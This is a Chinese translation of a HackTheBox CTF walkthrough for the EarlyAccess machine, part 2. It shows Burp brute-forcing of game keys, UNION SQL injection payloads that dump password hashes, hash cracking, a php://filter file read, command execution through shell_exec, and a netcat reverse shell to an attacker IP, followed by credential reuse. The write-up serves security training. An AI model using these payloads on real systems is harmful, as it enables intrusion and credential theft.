<html>
<head>
<title>EarlyAccess from HackTheBox — Detailed Walkthrough — Part 2</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客盒子的早期访问—详细演练—第2部分</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/earlyaccess-from-hackthebox-detailed-walkthrough-part-2-ab26956b36de?source=collection_archive---------3-----------------------#2022-02-09">https://infosecwriteups.com/earlyaccess-from-hackthebox-detailed-walkthrough-part-2-ab26956b36de?source=collection_archive---------3-----------------------#2022-02-09</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><p id="b98e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">展示完成盒子所需的所有工具和技术。</p><h1 id="2581" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">机器信息</h1><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi lj"><img src="../Images/cb3648dfadb6162b9624f6617a287d54.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/format:webp/0*CNEJfrV8sJ8qovv_.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">黑客盒子的早期访问</figcaption></figure><p id="59d1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">欢迎学习提前访问演练的第2部分。如果你还没看完第1部分，你会想先看一下，让你明白我们下面要继续的重点。</p><p id="1277" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">到目前为止的故事…</p><p id="7aaa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们首先注册进入一个论坛，发现有一个XSS漏洞。最终，我们找到了一种方法来捕获管理员的会话令牌，并使用它来以他们的身份访问门户。让我们下载一个密钥生成器，在破译了它的工作原理后，我们生成了一个潜在密钥列表。</p><h1 id="fbfa" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">验证游戏密钥</h1><p id="1883" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">在第1部分的最后，我们有了一个Python密钥生成器，它给了我们一个可以尝试的密钥列表:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="c63c" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# python3 keygen.py<br/>KEY10-0A0O0-XPAA1-GAMD0-1294<br/>KEY10-0A0O0-XPAA2-GAMD0-1295<br/>KEY10-0A0O0-XPAA3-GAMD0-1296<br/>KEY10-0A0O0-XPAA4-GAMD0-1297<br/>KEY10-0A0O0-XPAA5-GAMD0-1298<br/>KEY10-0A0O0-XPAA6-GAMD0-1299<br/>&lt;SNIP&gt;</span></pre><p id="4eaa" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们的列表准备好了，现在回到网站的验证游戏钥匙区域，我们以管理员身份访问。在输入密钥以验证start Burp并将其设置为listening之前，也请记住将您的浏览器设置为使用Burp作为其代理。现在将任何内容粘贴到输入游戏密钥字段，并单击验证密钥:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ml"><img src="../Images/dd1cec3caabcdd0daf8300750f976cd2.png" data-original-src="https://miro.medium.com/v2/resize:fit:962/format:webp/0*ZMYpfjkF0iKjmGvY.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">验证游戏密钥</figcaption></figure><h1 id="7195" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">打嗝闯入者</h1><p id="4455" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">切换到打嗝来查看捕获的请求，将其转发给入侵者。在Positions选项卡上，将key更改为fuzz，突出显示它，然后单击右侧的Add:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mm"><img src="../Images/040f42730bf9a80385200d92cc5aacb1.png" data-original-src="https://miro.medium.com/v2/resize:fit:1176/format:webp/0*F70C6J3Gz8AfEAAv.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">使用打嗝入侵者蛮力</figcaption></figure><p id="4ace" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在切换到有效载荷标签，并粘贴在我们的关键列表:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mn"><img src="../Images/0c893cb2e5b36a9071bcb705a9136e8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:810/format:webp/0*TUvAiVqYg2kL4rj6.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">粘贴有效负载列表</figcaption></figure><p id="9b7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">最后，转到选项选项卡，将重定向更改为始终:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mo"><img src="../Images/257c106f9e4a8afc8ac74fe0073d4226.png" data-original-src="https://miro.medium.com/v2/resize:fit:706/format:webp/0*fM9CYUWgZe0svj4Y.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">将跟随重定向设置为总是</figcaption></figure><p id="166f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在开始攻击并观察结果:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mp"><img src="../Images/d153c42ec7516fb4458482fe3f0abfa5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1230/format:webp/0*wCTTKxZfZG6IKzWr.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">识别哪个键成功了</figcaption></figure><p id="2923" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们正在寻找一个返回长度为14190的请求，其余的都是14161。查看底部窗口，查看使用的钥匙。我们从回应中得知这是成功的。</p><p id="58e9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">复制并粘贴到验证游戏关键框，这一次你应该会获得成功:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mq"><img src="../Images/14b976ab1e5ec92e726936eac8fc19a4.png" data-original-src="https://miro.medium.com/v2/resize:fit:956/format:webp/0*huTeS2M0ESc0EJ7k.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">尝试有效密钥</figcaption></figure><h1 id="2ae6" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">注册游戏密钥</h1><p id="b7e9" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">现在以管理员身份注销，然后以我们的用户身份重新登录，转到注册密钥部分，将我们的有效密钥粘贴到:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi mr"><img src="../Images/c615def7670cf670f8e8a9d25b6226a2.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*MersbnnzDGD91G9y.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">为用户粘贴有效密钥</figcaption></figure><p id="b18b" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们现在可以登录游戏部分:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mw"><img src="../Images/3d31837271c844ddd5b0e2c7c8760b20.png" data-original-src="https://miro.medium.com/v2/resize:fit:758/format:webp/0*c2EnBmRbdy49uXjF.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">以用户身份登录游戏区</figcaption></figure><h1 id="0382" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">蛇</h1><p id="f221" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">如果你想试试这个游戏:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mx"><img src="../Images/81346851a1d7d09dd57816bba6fcc418.png" data-original-src="https://miro.medium.com/v2/resize:fit:1334/format:webp/0*5jKFfMFnrS8AZOQY.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">玩蛇游戏</figcaption></figure><p id="ecfe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">记分牌显示了我做得有多差:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi my"><img src="../Images/44b6186183eb07fcc805eb0819421d61.png" data-original-src="https://miro.medium.com/v2/resize:fit:1354/format:webp/0*ARztXVHQxmvSTNXW.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">记分牌上可怕的分数</figcaption></figure><h1 id="9bcf" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">SQLi开发</h1><p id="446a" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">这里没有太多其他事情要做，但是回想一下我们在开始时看到的论坛帖子，它说用户SingleQuoteMan在记分牌上的名字有问题。这是我们可以使用SQLi检索数据的一个线索。切换回我们的用户资料并更改名称:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi mz"><img src="../Images/f4fb5741669e584fa7304cade6aa4dbb.png" data-original-src="https://miro.medium.com/v2/resize:fit:794/format:webp/0*NuNlE1qKGsCTQREB.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">名称字段中的SQLi</figcaption></figure><p id="0308" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">现在回到记分板并刷新:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi na"><img src="../Images/e1be0967cad73212adf2d0235c6cbc6f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1112/format:webp/0*Zq6Rr8rrUfhxEryO.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">记分板上的SQL错误</figcaption></figure><p id="7a0c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这告诉我们记分板是易受攻击的，但是我们没有得到正确的语法。我为<a class="ae lv" href="https://pencer.io/ctf/ctf-thm-sqhell" rel="noopener ugc nofollow" target="_blank">这个</a>试衣间深入报道了SQLi。使用相同的过程，我将我的用户名改为:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="b930" class="mg km iq mc b gy mh mi l mj mk">pencer') union select table_name,null,null from information_schema.tables -- -</span></pre><p id="7ec1" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这让我可以看到数据库中的所有表:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nb"><img src="../Images/554d4f03660da29fc9dca55c48b31a8a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1180/format:webp/0*Ae9cRP3WYGsZ77XF.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">使用SQLi查看表</figcaption></figure><p id="fe7a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">接下来，我通过将用户名改为以下内容来转储用户和密码:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="997d" class="mg km iq mc b gy mh mi l mj mk">pencer') union select name,password,null from users -- -</span></pre><p id="acd9" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这给了我全部:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nc"><img src="../Images/50f47f63d6d058d20c556dd4220ceb2b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1168/format:webp/0*eYLilclXUX2L7Lwy.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">查看用户和密码哈希</figcaption></figure><h1 id="aa49" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">JohnTheRipper</h1><p id="0aa9" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">让我们用管理散列来破解它:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="a9af" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# echo "618292e936625aca8df61d5fff5c06837c49e491" &gt; hash</span><span id="7272" class="mg km iq mc b gy nd mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-sha1<br/>Using default input encoding: UTF-8<br/>Loaded 1 password hash (Raw-SHA1 [SHA1 256/256 AVX2 8x])<br/>Warning: no OpenMP support for this hash type, consider --fork=4<br/>Press 'q' or Ctrl-C to abort, almost any other key for status<br/>&lt;HIDDEN&gt;         (?)     <br/>1g 0:00:00:00 DONE (2022-02-03 22:22) 100.0g/s july12..foolish<br/>Use the "--show --format=Raw-SHA1" options to display all of the cracked passwords reliably<br/>Session completed.</span></pre><p id="d782" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">有了凭据，我们现在可以登录到开发网站:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi ne"><img src="../Images/64977fe28220df160c6734921ac5fb60.png" data-original-src="https://miro.medium.com/v2/resize:fit:886/format:webp/0*GQXSmKUysYIzmWVR.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">开发网站登录</figcaption></figure><p id="b07e" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在开发网站上没有很多，我们有这个页面与哈希工具:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div class="gh gi nf"><img src="../Images/460f82cae0d2a0c5702f9a3cd85c743e.png" data-original-src="https://miro.medium.com/v2/resize:fit:984/format:webp/0*6i3O_2FtoUXinSvB.png"/></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">开发站点哈希工具</figcaption></figure><p id="df0f" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这是一个文件工具:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi ng"><img src="../Images/39b4784bb17de231a4ca4a8c58de4024.png" data-original-src="https://miro.medium.com/v2/resize:fit:878/format:webp/0*TtnWBCF1_pSoJLdf.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">开发网站文件工具</figcaption></figure><h1 id="95eb" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">Feroxbuster</h1><p id="f22f" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">用户Feroxbuster查找子文件夹:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nh"><img src="../Images/e21bd377454e50729c3c82af9f26ff02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bCoe7Mz2QwSxsMAfVeun2A.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">扫描子文件夹</figcaption></figure><p id="8efd" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">动作听起来很有趣，让我们搜索一下:</p><figure class="lk ll lm ln gt lo gh gi paragraph-image"><div role="button" tabindex="0" class="ms mt di mu bf mv"><div class="gh gi nh"><img src="../Images/0f3bd36205b4a9a9c45b404d7c34a5d8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*tgd4eWY6NsWdYb1CZP59hQ.png"/></div></div><figcaption class="lr ls gj gh gi lt lu bd b be z dk translated">扫描发现的文件夹内部</figcaption></figure><h1 id="eb45" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">模糊参数</h1><p id="9329" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">Fuzzing找到了一个参数:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="58a2" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[/usr/share/seclists]<br/>└─# wfuzz --hw 3 -w Discovery/Web-Content/raft-large-words-lowercase.txt http://dev.earlyaccess.htb/actions/file.php?FUZZ<br/>********************************************************<br/>* Wfuzz 3.1.0 - The Web Fuzzer                         *<br/>********************************************************<br/>Target: http://dev.earlyaccess.htb/actions/file.php?FUZZ<br/>Total requests: 50<br/>=====================================================================<br/>ID           Response   Lines    Word       Chars       Payload<br/>=====================================================================<br/>000000050:   500        0 L      2 W        32 Ch       "filepath"</span></pre><h1 id="eeb8" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">数据泄漏</h1><p id="d0aa" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">尝试访问一个已知文件:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="620c" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# curl <a class="ae lv" href="http://dev.earlyaccess.htb/actions/file.php?filepath=/etc/passwd" rel="noopener ugc nofollow" target="_blank">http://dev.earlyaccess.htb/actions/file.php?filepath=/etc/passwd</a></span><span id="fd5e" class="mg km iq mc b gy nd mi l mj mk">&lt;h1&gt;ERROR:&lt;/h1&gt;For security reasons, reading outside the current directory is prohibited!</span></pre><p id="9312" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试读取file.php:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="56c0" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# curl http://dev.earlyaccess.htb/actions/file.php?filepath=file.php <br/>  <br/>&lt;h2&gt;Executing file:&lt;/h2&gt;&lt;p&gt;file.php&lt;/p&gt;&lt;br&gt;&lt;h2&gt;Executed file successfully!</span></pre><p id="8952" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">尝试读取hash.php:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="616a" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# curl <a class="ae lv" href="http://dev.earlyaccess.htb/actions/file.php?filepath=hash.php" rel="noopener ugc nofollow" target="_blank">http://dev.earlyaccess.htb/actions/file.php?filepath=hash.php</a></span><span id="4b93" class="mg km iq mc b gy nd mi l mj mk">&lt;h2&gt;Executing file:&lt;/h2&gt;&lt;p&gt;hash.php&lt;/p&gt;&lt;br&gt;&lt;br /&gt;<br/>&lt;b&gt;Warning&lt;/b&gt;:  Cannot modify header information - headers already sent by (output started at /var/www/earlyaccess.htb/dev/actions/file.php:18) in &lt;b&gt;/var/www/earlyaccess.htb/dev/actions/hash.php&lt;/b&gt; on line &lt;b&gt;77&lt;/b&gt;&lt;br /&gt;&lt;h2&gt;Executed file successfully!</span></pre><p id="eacb" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这给了我们一个文件路径。就像我们在<a class="ae lv" href="https://www.hackthebox.com/home/machines/profile/421" rel="noopener ugc nofollow" target="_blank"> Timing </a>上做的一样，我们可以对文件进行base64编码来检索它:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="0898" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# curl <a class="ae lv" href="http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php" rel="noopener ugc nofollow" target="_blank">http://dev.earlyaccess.htb/actions/file.php?filepath=php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php</a></span><span id="89a1" class="mg km iq mc b gy nd mi l mj mk">&lt;h2&gt;Executing file:&lt;/h2&gt;<br/>&lt;p&gt;php://filter/convert.base64-encode/resource=/var/www/earlyaccess.htb/dev/actions/hash.php&lt;/p&gt;<br/>&lt;br&gt;PD9waHAKaW5jbHVkZV9vbmNlICIuLi9pbmNsdWRlcy9zZXNzaW9uLnBocCI7CgpmdW5jdGlvbiBoYXNoX3B3KCRoYXN<br/>oX2Z1bmN0aW9uLCAkcGFiAgICBvYl9lbmRfY2xlYW4oKTsKICAgIHJldHVybiAkaGFzaDsKfQoKdHJ5CnsKICAgIGlmKGlz<br/>&lt;SNIP&gt;</span></pre><p id="e115" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">解码base64:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="842f" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# echo "PD9waHAKaW5jbHVkZ9zZXNzaW9uLnB&lt;SNIP&gt;ICByZXR1cm47Cn0KPz4=" | base64 -d</span></pre><h1 id="96aa" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">散列文件代码审查</h1><p id="0fc5" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">现在我们有hash.php的档案要看。有趣的是这个函数:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="ac62" class="mg km iq mc b gy mh mi l mj mk">function hash_pw($hash_function, $password)<br/>{<br/>    // DEVELOPER-NOTE: There has gotta be an easier way...<br/>    ob_start();<br/>    // Use inputted hash_function to hash password<br/>    $hash = @$hash_function($password);<br/>    ob_end_clean();<br/>    return $hash;<br/>}</span></pre><p id="d8ff" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们可以提供密码和散列函数。然后在脚本的下面:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="bcef" class="mg km iq mc b gy mh mi l mj mk">if(isset($_REQUEST['hash_function']) &amp;&amp; isset($_REQUEST['hash']) &amp;&amp; isset($_REQUEST['password']))<br/>{<br/>    // Only allow custom hashes, if `debug` is set<br/>      if($_REQUEST['hash_function'] !== "md5" &amp;&amp; $_REQUEST['hash_function'] !== "sha1" &amp;&amp; !isset($_REQUEST['debug']))<br/>        throw new Exception("Only MD5 and SHA1 are currently supported!");<br/>        {<br/>                $hash = hash_pw($_REQUEST['hash_function'], $_REQUEST['password']);</span><span id="2b6f" class="mg km iq mc b gy nd mi l mj mk">$_SESSION['verify'] = ($hash === $_REQUEST['hash']);<br/>                header('Location: /home.php?tool=hashing');<br/>                return;<br/>            }<br/>        }</span></pre><h1 id="83aa" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">调试漏洞</h1><p id="91db" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">如果我们修改请求并发送一个debug=true的参数，那么我们可以使用shell_exec作为散列函数来执行我们自己的命令。让我们试着列出目录:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="4d8d" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# curl -s -L -k -X POST -b 'PHPSESSID=7241f80366715e8f4308d92c6837234d' --data-binary 'action=hash&amp;redirect=true&amp;password=ls&amp;hash_function=shell_exec&amp;debug=true' 'http://dev.earlyaccess.htb/actions/hash.php' | grep "Hashed password" -A 5</span><span id="5a06" class="mg km iq mc b gy nd mi l mj mk">&lt;h3&gt;Hashed password:&lt;/h3&gt;<br/>file.php<br/>hash.php<br/>login.php<br/>logout.php</span></pre><p id="601d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">反向外壳的时间:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="1ba7" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# curl -s -L -k -X POST -b 'PHPSESSID=7241f80366715e8f4308d92c6837234d' --data-binary 'action=hash&amp;redirect=true&amp;password=nc+10.10.14.12+1337+-e+/bin/bash&amp;hash_function=shell_exec&amp;debug=true' $'http://dev.earlyaccess.htb/actions/hash.php'</span></pre><h1 id="e280" class="kl km iq bd kn ko kp kq kr ks kt ku kv kw kx ky kz la lb lc ld le lf lg lh li bi translated">用户外壳</h1><p id="5414" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">切换到等待中的netcat监听器，查看我们是否已连接:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="6b50" class="mg km iq mc b gy mh mi l mj mk">┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# nc -nlvp 1337<br/>listening on [any] 1337 ...<br/>connect to [10.10.14.12] from (UNKNOWN) [10.10.11.110] 46424</span></pre><p id="93a3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将shell升级到更有用的版本:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="5a97" class="mg km iq mc b gy mh mi l mj mk">python3 -c 'import pty;pty.spawn("/bin/bash")'<br/>www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ^Z<br/>zsh: suspended  nc -nlvp 1337<br/>┌──(root💀kali)-[~/htb/earlyaccess]<br/>└─# stty raw -echo; fg<br/>[1]  + continued  nc -nlvp 1337<br/>www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ export TERM=xterm<br/>www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ stty rows 60 cols 236</span></pre><p id="80f0" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我们通过www-data连接，但是在主文件夹中我们看到了另一个用户。幸运的是，他们重新使用了我们之前破解的管理员密码:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="ddcc" class="mg km iq mc b gy mh mi l mj mk">www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ ls -lsa /home<br/>4 drwxr-xr-x 2 www-adm www-adm 4096 Feb  3 15:50 www-adm</span><span id="938c" class="mg km iq mc b gy nd mi l mj mk">www-data@webserver:/var/www/earlyaccess.htb/dev/actions$ su www-adm<br/>Password: <br/>www-adm@webserver:/var/www/earlyaccess.htb/dev/actions$</span></pre><p id="4e1c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">在我们的主文件夹中没有用户标志，但是。wgetrc文件很有趣:</p><pre class="lk ll lm ln gt mb mc md me aw mf bi"><span id="29d6" class="mg km iq mc b gy mh mi l mj mk">www-adm@webserver:/var/www/earlyaccess.htb/dev/actions$ cd /home/www-adm/<br/>www-adm@webserver:~$ ls -lsa<br/>0 lrwxrwxrwx 1 root    root       9 Feb  3 15:50 .bash_history<br/>4 -rw-r--r-- 1 www-adm www-adm  220 Apr 18  2019 .bash_logout<br/>4 -rw-r--r-- 1 www-adm www-adm 3526 Apr 18  2019 .bashrc<br/>4 -rw-r--r-- 1 www-adm www-adm  807 Apr 18  2019 .profile<br/>4 -r-------- 1 www-adm www-adm   33 Feb  3 15:50 .wgetrc</span><span id="75e5" class="mg km iq mc b gy nd mi l mj mk">www-adm@webserver:~$ cat .wgetrc <br/>user=api<br/>password=&lt;HIDDEN&gt;</span></pre><p id="bca8" 